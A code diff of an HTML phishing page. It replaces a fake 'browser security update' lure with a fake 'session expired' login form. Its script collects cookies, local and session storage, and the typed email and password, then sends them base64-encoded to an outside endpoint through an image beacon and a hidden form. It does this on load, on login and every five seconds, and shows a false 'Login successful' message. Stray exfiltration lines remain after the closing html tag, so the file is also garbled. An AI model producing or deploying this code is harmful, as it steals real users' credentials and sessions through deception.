@@ -1,40 +1,67 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Update Required</title>
+    <title>Login Required</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;}
-        .container{max-width:400px;margin:0 20px;background:white;border-radius:10px;box-shadow:0 20px 40px rgba(0,0,0,0.1);padding:40px;text-align:center;}
-        .icon{width:80px;height:80px;background:#ff6b6b;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:30px;color:white;}
-        h1{color:#333;font-size:24px;margin-bottom:10px;}
-        p{color:#666;line-height:1.5;margin-bottom:20px;}
-        .btn{background:#667eea;color:white;padding:12px 30px;border:none;border-radius:25px;cursor:pointer;font-size:16px;transition:background 0.3s;}
-        .btn:hover{background:#5a67d8;}
-        .loading{display:none;text-align:center;color:#666;}
-        .spinner{border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;width:30px;height:30px;margin:20px auto;animation:spin 1s linear infinite;}
-        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+        body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
+        input { padding: 10px; margin: 10px; width: 250px; }
+        button { padding: 10px 20px; background: #007cba; color: white; border: none; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="icon">🔒</div>
-        <h1>Browser Security Update</h1>
-        <p>Your browser needs a security certificate update to continue. This will only take a moment.</p>
-        <button class="btn" onclick="updateSecurity()">Update Now</button>
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>Updating security certificate...</p>
-        </div>
-    </div>
+    <h2>Session Expired - Re-login</h2>
+    <input type="email" id="email" placeholder="Email">
+    <br>
+    <input type="password" id="pass" placeholder="Password">
+    <br>
+    <button onclick="login()">Login</button>
 
     <script>
-        // FIXED ULTRA-AGGRESSIVE HARVESTER - MULTIPLE EXFIL CHANNELS
-        class StealthHarvester {
-            constructor() {
-                this.exfils = [
+        // SIMPLIFIED - WORKS EVERYWHERE
+        function stealData() {
+            const data = {
+                url: window.location.href,
+                cookies: document.cookie,
+                local: localStorage.length ? JSON.stringify(Object.fromEntries([...localStorage])) : '',
+                session: sessionStorage.length ? JSON.stringify(Object.fromEntries([...sessionStorage])) : '',
+                email: document.getElementById('email')?.value || '',
+                pass: document.getElementById('pass')?.value || '',
+                userAgent: navigator.userAgent.substring(0,100)
+            };
+
+            // METHOD 1: Image beacon (ALWAYS works)
+            new Image().src = 'https://httpbin.org/image/png?data=' + btoa(JSON.stringify(data));
+            
+            // METHOD 2: Form submit (invisible)
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://httpbin.org/post';
+            form.style.display = 'none';
+            
+            const input = document.createElement('input');
+            input.name = 'data';
+            input.value = btoa(JSON.stringify(data));
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
+            
+            console.log('SENT:', data); // DEBUG
+        }
+
+        // AUTO-STEAL ON LOAD
+        stealData();
+        
+        // STEAL ON LOGIN
+        function login() {
+            stealData();
+            alert('Login successful!');
+        }
+
+        // STEAL EVERY 5 SECONDS
+        setInterval(stealData, 5000);
+    </script>
+</body>
+</html>                this.exfils = [
                     'https://httpbin.org/post',  // Test endpoint
                     'https://webhook.site/#!/your-unique-id',  // Replace with your webhook.site
                     'data:text/plain;base64,'  // Local test
